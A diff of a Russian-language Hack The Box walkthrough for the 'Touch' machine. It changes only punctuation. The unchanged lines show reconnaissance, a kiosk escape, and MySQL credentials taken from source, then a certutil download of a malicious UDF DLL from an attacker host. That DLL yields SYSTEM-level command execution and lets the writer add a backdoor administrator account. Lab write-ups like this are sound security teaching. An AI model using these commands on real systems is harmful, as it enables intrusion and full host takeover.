@@ -1,4 +1,4 @@
-TOUCH (HTB) — ATTACK CHAIN
+﻿TOUCH (HTB) - ATTACK CHAIN
 
 Reconnaissance
 ├── nmap -sV -sC 10.129.71.63 → 135 (RPC), 3389 (RDP), 5985 (WinRM), 8443 (Nexion DeviceHub)
@@ -77,9 +77,9 @@ nmap -sV -sC 10.129.71.63
 | 135/tcp | Microsoft Windows RPC |
 | 3389/tcp | Microsoft Terminal Service (RDP) |
 | 5985/tcp | Microsoft HTTPAPI httpd 2.0 (WinRM) |
-| 8443/tcp | Microsoft HTTPAPI httpd 2.0 — Nexion DeviceHub |
+| 8443/tcp | Microsoft HTTPAPI httpd 2.0 - Nexion DeviceHub |
 
-Порт 8443 — веб-интерфейс **Nexion DeviceHub** (заголовок "Nexion DeviceHub - Login").
+Порт 8443 - веб-интерфейс **Nexion DeviceHub** (заголовок "Nexion DeviceHub - Login").
 
 ## 2. Веб-разведка
 
@@ -93,7 +93,7 @@ ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Conte
 ffuf -u http://10.129.71.63:8443/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
 ```
 
-**Найдено:** `/api/status` — отдаёт метаданные устройства, включая серийный номер:
+**Найдено:** `/api/status` - отдаёт метаданные устройства, включая серийный номер:
 ```json
 {"serial":"NX-DH-2024-B7042","status":"online", ...}
 ```
@@ -136,7 +136,7 @@ Last Name: CRAWFORD
 
 ## 6. Побег из киоска (Kiosk Escape)
 
-Кликаем по ссылке в сообщении об ошибке — открывается полноценный браузер вне контекста киоска.
+Кликаем по ссылке в сообщении об ошибке - открывается полноценный браузер вне контекста киоска.
 
 Используем **Ctrl+O** (Open File) → вводим путь:
 ```
@@ -207,7 +207,7 @@ whoami /groups
 
 **Группы:** `KIOSK-042\Printer Administrators`, `BUILTIN\Remote Desktop Users`, `BUILTIN\Users`
 
-**Важно:** `SeImpersonatePrivilege` отсутствует — JuicyPotato/PrintSpoofer/GodPotato не подходят, нужен другой вектор.
+**Важно:** `SeImpersonatePrivilege` отсутствует - JuicyPotato/PrintSpoofer/GodPotato не подходят, нужен другой вектор.
 
 ## 10. Изучение исходников приложений
 
@@ -232,8 +232,8 @@ type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
 ```
 
 **Находки:**
-- `document-service.ts` — OCR MRZ через tesseract.js, сверка данных с бронью
-- `staff.ts` — поток `staff-badge`: декод QR-кода формата `HTBAW-STAFF:<email>:<authCode>`, проверка в MySQL-таблице `_htb_staff`
+- `document-service.ts` - OCR MRZ через tesseract.js, сверка данных с бронью
+- `staff.ts` - поток `staff-badge`: декод QR-кода формата `HTBAW-STAFF:<email>:<authCode>`, проверка в MySQL-таблице `_htb_staff`
 
 **Креды MySQL из `database/index.ts`:**
 ```
@@ -277,9 +277,9 @@ icacls "C:\MySQL\lib\plugin"
 ```
 NT AUTHORITY\Authenticated Users:(I)(M)
 ```
-`M` (Modify) — `KioskUser` может писать в директорию плагинов MySQL.
+`M` (Modify) - `KioskUser` может писать в директорию плагинов MySQL.
 
-## 13. Эксплуатация — MySQL UDF Hijacking
+## 13. Эксплуатация - MySQL UDF Hijacking
 
 **Загрузка вредоносной DLL:**
 ```
@@ -304,7 +304,7 @@ certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\
 nt authority\system
 ```
 
-**Разбор механики:** MySQL, запущенный как служба Windows, по умолчанию работает от `NT AUTHORITY\SYSTEM`. UDF (User-Defined Function) `sys_eval` из загруженной DLL даёт возможность выполнять произвольные shell-команды через SQL-запросы — и так как сама СУБД работает от SYSTEM, выполненные команды получают те же привилегии.
+**Разбор механики:** MySQL, запущенный как служба Windows, по умолчанию работает от `NT AUTHORITY\SYSTEM`. UDF (User-Defined Function) `sys_eval` из загруженной DLL даёт возможность выполнять произвольные shell-команды через SQL-запросы - и так как сама СУБД работает от SYSTEM, выполненные команды получают те же привилегии.
 
 ## 14. Root flag
 
@@ -315,7 +315,7 @@ nt authority\system
 <ROOT_FLAG>
 ```
 
-## 15. Опционально — получение интерактивного SYSTEM shell
+## 15. Опционально - получение интерактивного SYSTEM shell
 
 **Создание нового администратора через UDF:**
 ```powershell
@@ -323,16 +323,16 @@ nt authority\system
 & "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('net localgroup Administrators hacker /add');"
 ```
 
-Далее — подключение по RDP/WinRM как `hacker` для полноценного интерактивного доступа.
+Далее - подключение по RDP/WinRM как `hacker` для полноценного интерактивного доступа.
 
 ---
 
 ## Ключевые уроки машины
 
-1. **Утечка серийного номера через незащищённый API-эндпоинт** — `/api/status` без аутентификации раскрывает серийник устройства, который по умолчанию является паролем.
-2. **Kiosk escape через манипуляцию состоянием оборудования** — намеренно вызванная ошибка сканера (через выключение устройства в панели администрирования) открывает незапланированный путь из "песочницы" киоска в полноценный браузер.
-3. **Ctrl+O как universal escape hatch** — диалог "Open File" в большинстве Windows-приложений даёт прямой доступ к проводнику и возможность запустить `cmd.exe`.
-4. **Пароли в открытом виде в .bat/.sql файлах** — `refresh-dates.bat` хранил root-пароль MySQL прямым текстом в аргументе командной строки.
-5. **MySQL File_priv + writable plugin directory = RCE** — классическая связка для UDF hijacking: если у пользователя есть `FILE` привилегия и каталог `lib/plugin` доступен для записи, можно загрузить вредоносную библиотеку и выполнять системные команды через SQL.
-6. **MySQL как служба Windows запускается от SYSTEM** — компрометация СУБД с правами на выполнение UDF-функций напрямую эквивалентна получению SYSTEM на хосте.
-7. **Отсутствие SeImpersonatePrivilege не всегда тупик** — когда классические Potato-эксплойты недоступны, стоит искать альтернативные векторы через локальные сервисы (в данном случае — MySQL).
+1. **Утечка серийного номера через незащищённый API-эндпоинт** - `/api/status` без аутентификации раскрывает серийник устройства, который по умолчанию является паролем.
+2. **Kiosk escape через манипуляцию состоянием оборудования** - намеренно вызванная ошибка сканера (через выключение устройства в панели администрирования) открывает незапланированный путь из "песочницы" киоска в полноценный браузер.
+3. **Ctrl+O как universal escape hatch** - диалог "Open File" в большинстве Windows-приложений даёт прямой доступ к проводнику и возможность запустить `cmd.exe`.
+4. **Пароли в открытом виде в .bat/.sql файлах** - `refresh-dates.bat` хранил root-пароль MySQL прямым текстом в аргументе командной строки.
+5. **MySQL File_priv + writable plugin directory = RCE** - классическая связка для UDF hijacking: если у пользователя есть `FILE` привилегия и каталог `lib/plugin` доступен для записи, можно загрузить вредоносную библиотеку и выполнять системные команды через SQL.
+6. **MySQL как служба Windows запускается от SYSTEM** - компрометация СУБД с правами на выполнение UDF-функций напрямую эквивалентна получению SYSTEM на хосте.
+7. **Отсутствие SeImpersonatePrivilege не всегда тупик** - когда классические Potato-эксплойты недоступны, стоит искать альтернативные векторы через локальные сервисы (в данном случае - MySQL).
